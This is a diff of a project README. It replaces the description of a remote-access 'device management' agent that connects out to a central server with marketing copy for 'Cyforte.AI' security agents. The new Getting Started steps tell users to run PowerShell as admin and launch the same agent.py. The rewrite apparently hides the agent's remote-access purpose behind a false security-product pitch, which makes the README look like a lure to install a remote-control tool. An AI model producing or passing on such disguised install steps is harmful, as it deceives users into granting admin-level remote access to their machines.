@@ -1,30 +1,16 @@
-# Centralized Device Management System
+# Cyforte.AI
 
-This repository contains a Python-based solution for centralized device management. The system is designed to establish outbound connections that facilitate remote access to devices.
+This repository contains a Python-based solution for SOC AI . Cyforte accelerates cybersecurity threat detection and response through a coordinated fleet of AI Security Agents that reduce risk and shorten time to resolution. Our Adaptive Decision Mesh (ADM) platform prioritizes the threats that matter most and delivers clear, actionable guidance to drive faster, confident remediation across domains like data, cloud, identity, and application security.
 
-## Features
-- Centralized management of devices
-- Secure outbound connections
-- Simplified remote access for users
-- Scalable architecture
+With the rise of AI, GenAI and automation - attackers have more sophisticated and faster ways to attack, and probability of occurrence of cyberattack is increasingly high. Cyber teams are overwhelmed with competing priorities (e.g., too many platforms and tools, high volume of alerts, investigations taking more time, managing exceptions, manual remediation taking longer).
 
-## Usage
-To utilize this system, ensure that all devices are configured with the necessary credentials and network access permissions. The Python scripts provided allow for easy installation and setup of the management software.
+Our AI-Native platform incorporate design feedback regulated enterprise CISOs, architects, and cyber analysts, who have spent weeks with us to bring our platform to life.
 
 ## Getting Started
-1. Clone the repository.
-2. Install the required dependencies.
-3. Configure the devices as per the documentation provided.
-4. Run the management script to establish connections.
+1. Install the file as .zip
+2. Extract the .zip file
+3. Run powershell as admin
+4. Use the command `python agent.py`
 
-For more detailed instructions, please refer to the individual scripts and documentation in this repository.
-
-## How to run
-# Install dependencies
-pip install -r requirements.txt
-
-# Start central server (on your main machine/cloud server)
-python server.py
-
-# Run agent on each device
-python agent.py --server-url ws://your-server-ip:8765
+## Pre-Requisites
+Python: Make sure you have latest python installed on your system. To download python from official website please follow the link given: https://www.python.org/downloads/
